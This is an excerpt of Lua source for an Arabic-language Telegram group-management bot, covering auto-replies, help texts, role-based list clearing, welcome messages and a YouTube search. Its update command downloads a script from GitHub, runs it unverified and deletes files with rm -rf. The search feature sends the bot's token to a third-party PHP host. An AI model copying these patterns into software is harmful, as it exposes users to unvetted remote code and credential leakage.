Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevRio:del(Matrx..'Rio:Add:AllRed'..msg.sender_user_id_)
...
Text = "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevRio:set(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(Matrx.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(Matrx.."Rio:Sudo:AllRed",text)
DevRio:set(Matrx.."DelSudoRep",text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تغير الرد •",callback_data="/ChangeAllRed:"..msg.sender_user_id_}},{{text="• الغاء •",callback_data="/CancelAllRed:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
...
local redod = DevRio:smembers(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevRio:smembers(Matrx..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevRio:get(Matrx..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevRio:del(Matrx..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevRio:smembers(Matrx..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Matrx.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevRio:get(Matrx.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevRio:get(Matrx.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevRio:get(Matrx.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevRio:get(Matrx.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevRio:get(Matrx.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevRio:get(Matrx.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevRio:get(Matrx.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح ردود المدير •",callback_data="/DelGpRed:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
for k,v in pairs(redod) do
DevRio:del(Matrx..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(Matrx..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Matrx.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevRio:get(Matrx.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevRio:get(Matrx.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevRio:get(Matrx.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevRio:get(Matrx.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevRio:get(Matrx.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevRio:get(Matrx.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevRio:get(Matrx.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح ردود المطور •",callback_data="/DelGpRedAll:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
DevRio:set(Matrx..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevRio:set(Matrx..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help0'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help01'..msg.sender_user_id_)
if MatrxTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help21'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help31'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help41'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help51'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Matrx..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local MatrxTeam =  DevRio:get(Matrx..'Rio:Help61'..msg.sender_user_id_)
if MatrxTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Matrx..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
keyboard = {} 
if Sudo(msg) then
keyboard.inline_keyboard = {{{text="• مسح الاساسيين •",callback_data="/DelRioSudo:"..msg.sender_user_id_},{text="• مسح الثانويين •",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text="• مسح المطورين •",callback_data="/DelSudoBot:"..msg.sender_user_id_},{text="• مسح المالكين •",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="• مسح المنشئين الاساسيين •",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="• مسح المنشئين •",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif RioSudo(msg) then
keyboard.inline_keyboard = {{{text="• مسح الثانويين •",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text="• مسح المطورين •",callback_data="/DelSudoBot:"..msg.sender_user_id_},{text="• مسح المالكين •",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="• مسح المنشئين الاساسيين •",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="• مسح المنشئين •",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif SecondSudo(msg) then
...
keyboard.inline_keyboard = {{{text="• مسح المنشئين الاساسيين •",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="• مسح المنشئين •",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif BasicConstructor(msg) then
keyboard.inline_keyboard = {{{text="• مسح المنشئين •",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Constructor(msg) then
keyboard.inline_keyboard = {{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_},{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Manager(msg) then
keyboard.inline_keyboard = {{{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Admin(msg) then
keyboard.inline_keyboard = {{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
end
Msg_id = msg.id_/2097152/0.5
...
local Leave = DevRio:get(Matrx..'Rio:Leave')
local Text = [[
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevRio:get(Matrx.."Rio:WhyTube"..msg.chat_id_) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('http://ccccxcc.ml/Matrx/YtMatrx.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source Matrx     --
if SecondSudo(msg) then
if text == "تحديث السورس" and ChCheck(msg) or text == "تحديث سورس" and ChCheck(msg) or text == "↫ تحديث السورس ᥀" and ChCheck(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس ماتركس', 1, 'md') 
os.execute('rm -rf Matrx.lua.lua') 
os.execute('wget https://raw.githubusercontent.com/MatrxTeam/Matrx/master/Matrx.lua') 
dofile('Matrx.lua') 
io.popen("rm -rf ../.telegram-cli/*")
...
local Users = DevRio:smembers(Matrx.."User_Bot")
local Groups = DevRio:smembers(Matrx..'Chek:Groups')
local Sudos = DevRio:smembers(Matrx.."Sudo:User")
if DevRio:get(Matrx..'Name:Bot') then
DevRio:set(Matrx..'Rio:NameBot',(DevRio:get(Matrx..'Name:Bot') or 'ماتركس'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(Matrx..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(Matrx..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(Matrx..'Rio:Groups',Groups[i]) 
if DevRio:get(Matrx.."Private:Group:Link"..Groups[i]) then
DevRio:set(Matrx.."Rio:Groups:Links"..Groups[i],DevRio:get(Matrx.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(Matrx.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(Matrx..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(Matrx.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(Matrx..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevRio:sadd(Matrx.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(Matrx..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(Matrx.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(Matrx..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(Matrx.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(Matrx..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(Matrx.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(Matrx..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(Matrx.."Rio:VipMem:"..Groups[i], v)
end
DevRio:set(Matrx.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(Matrx.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevRio:set(Matrx..Lock..Groups[i],true)
end
end
...
DevRio:del(Matrx..'Rio:Text:BotWelcome')
DevRio:del(Matrx..'Rio:Photo:BotWelcome')
return false
end 
...
DevRio:del(Matrx..'Rio:Lock:BotWelcome')
return false
end 
...
DevRio:set(Matrx..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevRio:del(Matrx..'Rio:Text:BotWelcome')
DevRio:del(Matrx..'Rio:Photo:BotWelcome')
DevRio:set(Matrx.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(Matrx.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Matrx.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevRio:set(Matrx.."Rio:Text:BotWelcome",text) 
DevRio:set(Matrx.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(Matrx.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevRio:set(Matrx.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevRio:setex(Matrx.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevRio:del(Matrx.."DevText")
end end
--     Source Matrx     --
if DevRio:get(Matrx.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Matrx.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del(Matrx.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(Matrx..'Rio:ChText',texxt)
...
DevRio:setex(Matrx.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
Text = [[
᥀︙[قناة السورس](https://t.me/FZOFZ)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '᥀ قناة السورس',url="t.me/FZOFZ"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FZOFZ&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
Text = [[
᥀︙[مبرمج السورس](https://t.me/IIRIIRI)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '᥀ مبرمج السورس',url="t.me/IIRIIRI"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/IIRIIRI&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source Matrx     --
...
DevRio:incr(Matrx..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevRio:get(Matrx..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(Matrx..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Matrx..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
DevRio:srem(Matrx..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(Matrx..'Rio:Groups',v)  
end
...
DevRio:sadd(Matrx..'Rio:Groups',v)  
end end,nil) end
end
--     Source Matrx     --
end 
